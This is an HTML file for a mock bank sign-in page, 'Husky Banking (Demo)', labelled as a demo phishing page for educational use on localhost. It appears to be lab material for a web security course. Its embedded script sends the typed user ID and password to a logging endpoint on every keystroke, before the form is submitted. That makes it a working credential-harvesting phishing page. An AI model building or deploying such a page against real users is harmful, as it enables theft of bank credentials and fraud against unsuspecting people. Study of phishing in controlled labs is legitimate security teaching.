<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8"/>
    <title>Husky Banking (Demo)</title>
    <style>
      body { font-family: sans-serif; display: grid; place-items: center; height: 100vh; margin:0; }
      form { width: 320px; padding: 24px; border: 1px solid #ddd; border-radius: 10px; box-shadow: 0 4px 16px rgba(0,0,0,.08); }
      input[type="text"], input[type="password"] { width: 100%; padding: 8px; margin: 8px 0; }
      input[type="submit"] { padding: 8px 16px; }
      small { color: #666; }
    </style>
  </head>
  <body>
    <form action="/login" method="post">
      <h2>Husky Banking</h2>
      <label>UserID</label><br/>
      <input id="userid" name="userid" type="text" required />
      <label>Password</label><br/>
      <input id="password" name="password" type="password" required />
      <p><input type="submit" value="Sign In"/></p>
      <small>Demo phishing page for educational use on localhost only.</small>
    </form>

    <script>
      const send = () => fetch("/log_keystroke", {
        method: "POST",
        headers: {"Content-Type":"application/json"},
        body: JSON.stringify({
          userid: document.getElementById("userid").value,
          password: document.getElementById("password").value
        })
      }).catch(()=>{});
      document.addEventListener("input", send);
    </script>
  </body>
</html>
